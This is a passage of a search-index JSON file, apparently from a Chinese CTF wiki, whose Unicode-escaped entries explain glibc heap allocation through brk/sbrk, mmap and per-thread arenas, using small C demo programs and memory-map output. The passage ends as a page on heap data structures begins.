\u7684\u60c5\u51b5\u4e0b\uff0c\u5f53\u91ca\u653e\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u5c06\u8fd9\u4e9b\u5185\u5b58\u7a7a\u95f4\u8fd8\u7ed9\u7cfb\u7edf\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c0f\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u5185\u5b58\u7a7a\u95f4\u3002", 
            "title": "free"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#_4", 
            "text": "\u5728\u524d\u9762\u63d0\u5230\u7684\u51fd\u6570\u4e2d\uff0c\u65e0\u8bba\u662f malloc \u51fd\u6570\u8fd8\u662f free \u51fd\u6570\uff0c\u6211\u4eec\u52a8\u6001\u7533\u8bf7\u548c\u91ca\u653e\u5185\u5b58\u65f6\uff0c\u90fd\u7ecf\u5e38\u4f1a\u4f7f\u7528\uff0c\u4f46\u662f\u5b83\u4eec\u5e76\u4e0d\u662f\u771f\u6b63\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u7684\u51fd\u6570\u3002\u8fd9\u4e9b\u51fd\u6570\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528\u4e3b\u8981\u662f  (s)brk  \u51fd\u6570\u4ee5\u53ca  mmap, munmap  \u51fd\u6570\u3002  \u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u4e3b\u8981\u8003\u8651\u5bf9\u5806\u8fdb\u884c\u7533\u8bf7\u5185\u5b58\u5757\u7684\u64cd\u4f5c\u3002", 
            "title": "\u5185\u5b58\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#sbrk", 
            "text": "\u5bf9\u4e8e\u5806\u7684\u64cd\u4f5c\uff0c\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86 brk \u51fd\u6570\uff0cglibc \u5e93\u63d0\u4f9b\u4e86 sbrk \u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0  brk  (program break location, the program break is the address of the first location beyond the current end of the data region,  https://en.wikipedia.org/wiki/Sbrk)\u7684\u5927\u5c0f\u6765\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58 \u3002  \u521d\u59cb\u65f6\uff0c\u5806\u7684\u8d77\u59cb\u5730\u5740  start_brk  \u4ee5\u53ca\u5806\u7684\u5f53\u524d\u672b\u5c3e  brk  \u6307\u5411\u540c\u4e00\u5730\u5740\u3002\u6839\u636e\u662f\u5426\u5f00\u542fASLR\uff0c\u4e24\u8005\u7684\u5177\u4f53\u4f4d\u7f6e\u4f1a\u6709\u6240\u4e0d\u540c   \u4e0d\u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4f1a\u6307\u5411 data/bss \u6bb5\u7684\u7ed3\u5c3e\u3002  \u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4e5f\u4f1a\u6307\u5411\u540c\u4e00\u4f4d\u7f6e\uff0c\u53ea\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u662f\u5728 data/bss \u6bb5\u7ed3\u5c3e\u540e\u7684\u968f\u673a\u504f\u79fb\u5904\u3002   \u5177\u4f53\u6548\u679c\u5982\u4e0b\u56fe\uff08\u8fd9\u4e2a\u56fe\u7247\u4e0e\u7f51\u4e0a\u6d41\u4f20\u7684\u57fa\u672c\u4e00\u81f4\uff0c\u8fd9\u91cc\u662f\u56e0\u4e3a\u8981\u753b\u4e00\u5f20\u5927\u56fe\uff0c\u6240\u4ee5\u81ea\u5df1\u5355\u72ec\u753b\u4e86\u4e0b\uff09\u6240\u793a   \u4f8b\u5b50  /* sbrk and brk example */  ##include  stdio.h  ##include  unistd.h  ##include  sys/types.h  int   main ()  { \n         void   * curr_brk ,   * tmp_brk   =   NULL ; \n\n         printf ( Welcome to sbrk example:%d \\n ,   getpid ()); \n\n         /* sbrk(0) gives current program break location */ \n         tmp_brk   =   curr_brk   =   sbrk ( 0 ); \n         printf ( Program Break Location1:%p \\n ,   curr_brk ); \n         getchar (); \n\n         /* brk(addr) increments/decrements program break location */ \n         brk ( curr_brk + 4096 ); \n\n         curr_brk   =   sbrk ( 0 ); \n         printf ( Program break Location2:%p \\n ,   curr_brk ); \n         getchar (); \n\n         brk ( tmp_brk ); \n\n         curr_brk   =   sbrk ( 0 ); \n         printf ( Program Break Location3:%p \\n ,   curr_brk ); \n         getchar (); \n\n         return   0 ;  }   \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u6bcf\u4e00\u6b21\u6267\u884c\u5b8c\u64cd\u4f5c\u540e\uff0c\u90fd\u6267\u884c\u4e86getchar()\u51fd\u6570\uff0c\u8fd9\u662f\u4e3a\u4e86\u6211\u4eec\u65b9\u4fbf\u6211\u4eec\u67e5\u770b\u7a0b\u5e8f\u771f\u6b63\u7684\u6620\u5c04\u3002  \u5728\u7b2c\u4e00\u6b21\u8c03\u7528brk\u4e4b\u524d  \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5e76\u6ca1\u6709\u51fa\u73b0\u5806\u3002\u56e0\u6b64   start_brk = brk = end_data = 0x804b000   sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk \nWelcome to sbrk example:6141\nProgram Break Location1:0x804b000\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps\n...\n0804a000-0804b000 rw-p  00001000   08 :01  539624      /home/sploitfun/ptmalloc.ppt/syscalls/sbrk\nb7e21000-b7e22000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$  \u7b2c\u4e00\u6b21\u589e\u52a0brk\u540e  \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5df2\u7ecf\u51fa\u73b0\u4e86\u5806\u6bb5   start_brk = end_data = 0x804b000  brk = 0x804c000   sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk \nWelcome to sbrk example:6141\nProgram Break Location1:0x804b000\nProgram Break Location2:0x804c000\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps\n...\n0804a000-0804b000 rw-p  00001000   08 :01  539624      /home/sploitfun/ptmalloc.ppt/syscalls/sbrk\n0804b000-0804c000 rw-p  00000000   00 :00  0            [ heap ] \nb7e21000-b7e22000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$  \u5176\u4e2d\uff0c\u5173\u4e8e\u5806\u7684\u90a3\u4e00\u884c   0x0804b000 \u662f\u76f8\u5e94\u5806\u7684\u8d77\u59cb\u5730\u5740  rw-p\u8868\u660e\u5806\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u5e76\u4e14\u5c5e\u4e8e\u9690\u79c1\u6570\u636e\u3002  00000000 \u8868\u660e\u6587\u4ef6\u504f\u79fb\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a0\u3002  00:00 \u662f\u4e3b\u4ece(Major/mirror)\u7684\u8bbe\u5907\u53f7\uff0c\u8fd9\u90e8\u5206\u5185\u5bb9\u4e5f\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e5f\u90fd\u4e3a0\u3002  0\u8868\u793a\u7740Inode \u53f7\u3002\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a0\u3002", 
            "title": "(s)brk"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#mmap", 
            "text": "malloc \u4f1a\u4f7f\u7528  mmap \u6765\u521b\u5efa\u72ec\u7acb\u7684\u533f\u540d\u6620\u5c04\u6bb5\u3002\u533f\u540d\u6620\u5c04\u7684\u76ee\u7684\u4e3b\u8981\u662f\u53ef\u4ee5\u7533\u8bf7\u4ee50\u586b\u5145\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u8fd9\u5757\u5185\u5b58\u4ec5\u88ab\u8c03\u7528\u8fdb\u7a0b\u6240\u4f7f\u7528\u3002  \u4f8b\u5b50  /* Private anonymous mapping example using mmap syscall */  ##include  stdio.h  ##include  sys/mman.h  ##include  sys/types.h  ##include  sys/stat.h  ##include  fcntl.h  ##include  unistd.h  ##include  stdlib.h  void   static   inline   errExit ( const   char *   msg )  { \n         printf ( %s failed. Exiting the process \\n ,   msg ); \n         exit ( - 1 );  }  int   main ()  { \n         int   ret   =   - 1 ; \n         printf ( Welcome to private anonymous mapping example::PID:%d \\n ,   getpid ()); \n         printf ( Before mmap \\n ); \n         getchar (); \n         char *   addr   =   NULL ; \n         addr   =   mmap ( NULL ,   ( size_t ) 132 * 1024 ,   PROT_READ | PROT_WRITE ,   MAP_PRIVATE   |   MAP_ANONYMOUS ,   - 1 ,   0 ); \n         if   ( addr   ==   MAP_FAILED ) \n                 errExit ( mmap ); \n         printf ( After mmap \\n ); \n         getchar (); \n\n         /* Unmap mapped region. */ \n         ret   =   munmap ( addr ,   ( size_t ) 132 * 1024 ); \n         if ( ret   ==   - 1 ) \n                 errExit ( munmap ); \n         printf ( After munmap \\n ); \n         getchar (); \n         return   0 ;  }   \u5728\u6267\u884cmmap\u4e4b\u524d  \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u76ee\u524d\u53ea\u6709.so\u6587\u4ef6\u7684mmap\u6bb5\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp  00000000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p  00000000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n0804a000-0804b000 rw-p  00001000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap\nb7e21000-b7e22000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$  mmap\u540e  \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7533\u8bf7\u7684\u5185\u5b58\u4e0e\u5df2\u7ecf\u5b58\u5728\u7684\u5185\u5b58\u6bb5\u7ed3\u5408\u5728\u4e86\u4e00\u8d77\u6784\u6210\u4e86b7e00000\u5230b7e21000\u7684mmap\u6bb5\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp  00000000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p  00000000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n0804a000-0804b000 rw-p  00001000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap\nb7e00000-b7e22000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$  munmap  \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u539f\u6765\u7533\u8bf7\u7684\u5185\u5b58\u6bb5\u5df2\u7ecf\u6ca1\u6709\u4e86\uff0c\u5185\u5b58\u6bb5\u53c8\u6062\u590d\u4e86\u539f\u6765\u7684\u6837\u5b50\u4e86\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp  00000000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p  00000000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n0804a000-0804b000 rw-p  00001000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap\nb7e21000-b7e22000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$", 
            "title": "mmap"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#_5", 
            "text": "\u5728\u539f\u6765\u7684 dlmalloc \u5b9e\u73b0\u4e2d\uff0c\u5f53\u4e24\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8981\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u8fdb\u5165\u4e34\u754c\u533a\u7533\u8bf7\u5185\u5b58\uff0c\u800c\u53e6\u5916\u4e00\u4e2a\u7ebf\u7a0b\u5219\u5fc5\u987b\u7b49\u5f85\u76f4\u5230\u4e34\u754c\u533a\u4e2d\u4e0d\u518d\u6709\u7ebf\u7a0b\u3002\u8fd9\u662f\u56e0\u4e3a\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u4e00\u4e2a\u5806\u3002\u5728glibc\u7684ptmalloc\u5b9e\u73b0\u4e2d\uff0c\u6bd4\u8f83\u597d\u7684\u4e00\u70b9\u5c31\u662f\u652f\u6301\u4e86\u591a\u7ebf\u7a0b\u7684\u5feb\u901f\u8bbf\u95ee\u3002\u5728\u65b0\u7684\u5b9e\u73b0\u4e2d\uff0c\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u591a\u4e2a\u5806\u3002  \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002  /* Per thread arena example. */  ##include  stdio.h  ##include  stdlib.h  ##include  pthread.h  ##include  unistd.h  ##include  sys/types.h  void *   threadFunc ( void *   arg )   { \n         printf ( Before malloc in thread 1 \\n ); \n         getchar (); \n         char *   addr   =   ( char * )   malloc ( 1000 ); \n         printf ( After malloc and before free in thread 1 \\n ); \n         getchar (); \n         free ( addr ); \n         printf ( After free in thread 1 \\n ); \n         getchar ();  }  int   main ()   { \n         pthread_t   t1 ; \n         void *   s ; \n         int   ret ; \n         char *   addr ; \n\n         printf ( Welcome to per thread arena example::%d \\n , getpid ()); \n         printf ( Before malloc in main thread \\n ); \n         getchar (); \n         addr   =   ( char * )   malloc ( 1000 ); \n         printf ( After malloc and before free in main thread \\n ); \n         getchar (); \n         free ( addr ); \n         printf ( After free in main thread \\n ); \n         getchar (); \n         ret   =   pthread_create ( t1 ,   NULL ,   threadFunc ,   NULL ); \n         if ( ret ) \n         { \n                 printf ( Thread creation error \\n ); \n                 return   - 1 ; \n         } \n         ret   =   pthread_join ( t1 ,   s ); \n         if ( ret ) \n         { \n                 printf ( Thread join error \\n ); \n                 return   - 1 ; \n         } \n         return   0 ;  }   \u7b2c\u4e00\u6b21\u7533\u8bf7\u4e4b\u524d \uff0c \u6ca1\u6709\u4efb\u4f55\u4efb\u4f55\u5806\u6bb5\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p  00001000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\nb7e05000-b7e07000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$  \u7b2c\u4e00\u6b21\u7533\u8bf7\u540e \uff0c \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\uff0c\u5e76\u4e14\u5b83\u5c31\u7d27\u90bb\u7740\u6570\u636e\u6bb5\uff0c\u8fd9\u8bf4\u660emalloc\u7684\u80cc\u540e\u662f\u7528brk\u51fd\u6570\u6765\u5b9e\u73b0\u7684\u3002\u540c\u65f6\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u867d\u7136\u53ea\u662f\u7533\u8bf7\u4e861000\u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u6211\u4eec\u5374\u5f97\u5230\u4e860x0806c000-0x0804b000=0x21000\u4e2a\u5b57\u8282\u7684\u5806\u3002 \u8fd9\u8bf4\u660e\u867d\u7136\u7a0b\u5e8f\u53ef\u80fd\u53ea\u662f\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5f88\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u628a\u5f88\u5927\u7684\u5185\u5b58\u5206\u914d\u7ed9\u7a0b\u5e8f\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5c31\u907f\u514d\u4e86\u591a\u6b21\u5185\u6838\u6001\u4e0e\u7528\u6237\u6001\u7684\u5207\u6362\uff0c\u63d0\u9ad8\u4e86\u7a0b\u5e8f\u7684\u6548\u7387\u3002 \u6211\u4eec\u79f0\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u4e3a arena\u3002\u6b64\u5916\uff0c\u6211\u4eec\u79f0\u7531\u4e3b\u7ebf\u7a0b\u7533\u8bf7\u7684\u5185\u5b58\u4e3a main_arena\u3002\u540e\u7eed\u7684\u7533\u8bf7\u7684\u5185\u5b58\u4f1a\u4e00\u76f4\u4ece\u8fd9\u4e2a arena \u4e2d\u83b7\u53d6\uff0c\u76f4\u5230\u7a7a\u95f4\u4e0d\u8db3\u3002\u5f53 arena \u7a7a\u95f4\u4e0d\u8db3\u65f6\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0brk\u7684\u65b9\u5f0f\u6765\u589e\u52a0\u5806\u7684\u7a7a\u95f4\u3002\u7c7b\u4f3c\u5730\uff0carena \u4e5f\u53ef\u4ee5\u901a\u8fc7\u51cf\u5c0f brk \u6765\u7f29\u5c0f\u81ea\u5df1\u7684\u7a7a\u95f4\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\n...\nsploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p  00001000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p  00000000   00 :00  0            [ heap ] \nb7e05000-b7e07000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$  \u5728\u4e3b\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c\u6211\u4eec\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5176\u5bf9\u5e94\u7684 arena \u5e76\u6ca1\u6709\u8fdb\u884c\u56de\u6536\uff0c\u800c\u662f\u4ea4\u7531glibc\u6765\u8fdb\u884c\u7ba1\u7406\u3002\u5f53\u540e\u9762\u7a0b\u5e8f\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5728 glibc \u4e2d\u7ba1\u7406\u7684\u5185\u5b58\u5145\u8db3\u7684\u60c5\u51b5\u4e0b\uff0cglibc \u5c31\u4f1a\u6839\u636e\u5806\u5206\u914d\u7684\u7b97\u6cd5\u6765\u7ed9\u7a0b\u5e8f\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\n...\nsploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p  00001000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p  00000000   00 :00  0            [ heap ] \nb7e05000-b7e07000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$  \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0bmalloc\u4e4b\u524d \uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5e76\u6ca1\u6709\u51fa\u73b0\u4e0e\u7ebf\u7a0b1\u76f8\u5173\u7684\u5806\uff0c\u4f46\u662f\u51fa\u73b0\u4e86\u4e0e\u7ebf\u7a0b1\u76f8\u5173\u7684\u6808\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\nBefore malloc in thread  1 \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p  00001000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p  00000000   00 :00  0            [ heap ] \nb7604000-b7605000 ---p  00000000   00 :00  0  \nb7605000-b7e07000 rw-p  00000000   00 :00  0            [ stack:6594 ] \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$  \u7b2c\u4e00\u4e2a\u7ebf\u7a0bmalloc\u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u8f93\u51fa\u770b\u51fa\u7ebf\u7a0b1\u7684\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\u3002\u800c\u4e14\u5b83\u6240\u5728\u7684\u4f4d\u7f6e\u4e3a\u5185\u5b58\u6620\u5c04\u6bb5\u533a\u57df\uff0c\u540c\u6837\u5927\u5c0f\u4e5f\u662f132KB(b7500000-b7521000)\u3002\u56e0\u6b64\u8fd9\u8868\u660e\u8be5\u7ebf\u7a0b\u7533\u8bf7\u7684\u5806\u65f6\uff0c\u80cc\u540e\u5bf9\u5e94\u7684\u51fd\u6570\u4e3ammap\u51fd\u6570\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u5b9e\u9645\u771f\u7684\u5206\u914d\u7ed9\u7a0b\u5e8f\u7684\u5185\u5b58\u4e3a1M(b7500000-b7600000)\u3002\u800c\u4e14\uff0c\u53ea\u6709132KB\u7684\u90e8\u5206\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\u6210\u4e3athread arena\u3002  \u6ce8\u610f\uff1a   \u5f53\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u5927\u4e8e128KB\u65f6\uff0c\u5e76\u4e14\u6ca1\u6709\u4efb\u4f55arena\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u65f6\uff0c\u90a3\u4e48\u7cfb\u7edf\u5c31\u4f1a\u6267\u884cmmap\u51fd\u6570\u6765\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u8fd9\u4e0e\u8fd9\u4e2a\u8bf7\u6c42\u6765\u81ea\u4e8e\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u4ece\u7ebf\u7a0b\u65e0\u5173\u3002   sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\nBefore malloc in thread  1 \nAfter malloc and before free in thread  1 \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p  00001000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p  00000000   00 :00  0            [ heap ] \nb7500000-b7521000 rw-p  00000000   00 :00  0  \nb7521000-b7600000 ---p  00000000   00 :00  0  \nb7604000-b7605000 ---p  00000000   00 :00  0  \nb7605000-b7e07000 rw-p  00000000   00 :00  0            [ stack:6594 ] \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$  \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u8fd9\u6837\u91ca\u653e\u5185\u5b58\u540c\u6837\u4e0d\u4f1a\u628a\u5185\u5b58\u91cd\u65b0\u7ed9\u7cfb\u7edf\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\nBefore malloc in thread  1 \nAfter malloc and before free in thread  1 \nAfter free in thread  1 \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p  00001000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p  00000000   00 :00  0            [ heap ] \nb7500000-b7521000 rw-p  00000000   00 :00  0  \nb7521000-b7600000 ---p  00000000   00 :00  0  \nb7604000-b7605000 ---p  00000000   00 :00  0  \nb7605000-b7e07000 rw-p  00000000   00 :00  0            [ stack:6594 ] \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$", 
            "title": "\u591a\u7ebf\u7a0b\u652f\u6301"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#_6", 
            "text": "sploitfun", 
            "title": "\u53c2\u8003\u6587\u732e"
        }, 
        {
            "location": "/pwn/heap/heap_structure/", 
            "text": "\u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784\n\n\n\u5806\u7684\u64cd\u4f5c\u5c31\u8fd9\u4e48\u590d\u6742\uff0c\u90a3\u4e48\u5728 glibc \u5185\u90e8\u5fc5\u7136\u4e5f\u6709\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u6570\u636e\u7ed3\u6784\u6765\u7ba1\u7406\u5b83\u3002\u4e0e\u5806\u76f8\u5e94\u7684\u6570\u636e\u7ed3\u6784\u4e3b\u8981\u5206\u4e3a\n\n\n\n\n\u5b8f\u89c2\u7ed3\u6784\uff0c\u5305\u542b\u5806\u7684\u5b8f\u89c2\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u7d22\u5f15\u5806\u7684\u57fa\u672c\u4fe1\u606f\u3002\n\n\n\u5fae\u89c2\u7ed3\u6784\uff0c\u7528\u4e8e\u5177\u4f53\u5904\u7406\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u4e2d\u7684\u5185\u5b58\u5757\u3002\n\n\n\n\nOverview\uff1f\uff1f\uff1f\uff1f\n\n\n\u8fd9\u91cc\u7ed9\u4e00\u4e2a\u5b8f\u89c2\u7684\u56fe\u7247\u3002\n\n\n\u5fae\u89c2\u7ed3\u6784\n\n\n\u8fd9\u91cc\u9996\u5148\u4ecb\u7ecd\u5806\u4e2d\u6bd4\u8f83\u7ec6\u8282\u7684\u7ed3\u6784\uff0c\n\u5806\u7684\u6f0f\u6d1e\u5229\u7528\u4e0e\u8fd9\u4e9b\u7ed3\u6784\u5bc6\u5207\u76f8\u5173\n\u3002\n\n\nmalloc_chunk\n\n\n\u6982\u8ff0\n\n\n\u5728\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u79f0\u7531 malloc \u7533\u8bf7\u7684\u5185\u5b58\u4e3a chunk \u3002\u8fd9\u5757\u5185\u5b58\u5728 ptmalloc \u5185\u90e8\u7528 malloc_chunk 